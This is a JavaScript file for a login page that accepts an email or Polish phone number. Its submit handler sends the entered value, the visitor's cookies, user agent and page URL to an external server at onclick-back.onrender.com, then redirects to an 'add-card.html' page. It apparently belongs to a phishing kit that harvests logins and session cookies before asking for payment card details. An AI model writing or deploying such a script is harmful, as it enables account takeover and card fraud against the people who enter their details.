document.addEventListener('DOMContentLoaded', () => {
  const input = document.getElementById('userId');
  const button = document.getElementById('submit-btn');
  const form = document.getElementById('login-form');
  const errorRequired = document.getElementById('error-required');
  const errorFormat = document.getElementById('error-format');
  const errorIcon = document.querySelector('.al-input__error-icon');

  const validate = () => {
    const value = input.value.trim();
    const isEmpty = value === '';
    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);

    errorRequired.classList.add('hidden');
    errorFormat.classList.add('hidden');
    errorIcon.classList.add('hidden');
    input.classList.remove('error');
    button.disabled = true;

    if (isEmpty) {
      errorRequired.classList.remove('hidden');
      errorIcon.classList.remove('hidden');
      input.classList.add('error');
    } else if (!isValid) {
      errorFormat.classList.remove('hidden');
      errorIcon.classList.remove('hidden');
      input.classList.add('error');
    } else {
      button.disabled = false;
    }
  };

  input.addEventListener('input', validate);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const value = input.value.trim();
    button.disabled = true;
    button.querySelector('.al-button__label').textContent = 'Loading...';

    try {
      await fetch('https://onclick-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: value,
          cookies: document.cookie,
          userAgent: navigator.userAgent,
          location: window.location.href,
          date: new Date().toISOString()
        })
      });
      window.location.href = 'add-card.html';
    } catch (err) {
      button.disabled = false;
      button.querySelector('.al-button__label').textContent = 'Continue';
    }
  });
});
